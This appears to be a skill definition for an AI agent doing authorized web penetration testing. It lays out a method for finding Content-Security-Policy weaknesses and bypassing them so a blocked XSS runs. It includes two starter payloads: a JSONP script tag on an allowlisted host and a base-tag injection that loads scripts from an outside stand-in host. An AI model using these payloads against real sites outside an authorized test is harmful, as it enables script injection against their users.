---
name: content-security-policy-bypass
description: >-
  Evaluate and bypass Content-Security-Policy (CWE-693) so an otherwise-blocked XSS executes:
  find weak sources (unsafe-inline, unsafe-eval, wildcard/http:, overly-broad host allowlists,
  missing object/base-uri), JSONP endpoints and script gadgets on allowed origins, and nonce/
  strict-dynamic mistakes. Invoke when an XSS sink exists but CSP prevents execution.
family: 07-client-side
type: exploit
owasp: [A05:2021]
cwe: [CWE-693]
requires: [scope-guard, evidence-recorder]
authorization: required
---

# CSP Bypass

## Invoke when
- A confirmed XSS sink is blocked by CSP, or you're assessing CSP strength.

## Methodology
1. Parse the policy: `script-src`, `object-src`, `base-uri`, `default-src`, nonce/hash, strict-dynamic.
2. Weakness hunt: `unsafe-inline`/`unsafe-eval`, `*`/`https:`/data: sources, allowlisted CDNs hosting
   JSONP or known script gadgets (Angular/etc.), missing `object-src`/`base-uri`.
3. Nonce reuse/predictability; DOM-based `base` injection; `strict-dynamic` with an injectable script.
4. Build the payload that satisfies the policy (JSONP callback, gadget, allowed-host script).

## Starter payloads
- JSONP on an allowlisted host: `<script src="//allowed-cdn/api?callback=PROOF">`
- `base-uri` missing: `<base href="//collab.tld/">` to hijack relative script loads.

## False-positive filters
- A nonce-based `strict-dynamic` policy with no injectable existing script and locked object/base-uri
  may be genuinely unbypassable — report CSP as effective mitigation.

## Chains to
- `reflected-xss`/`stored-xss`/`dom-xss` (deliver once bypass is found).
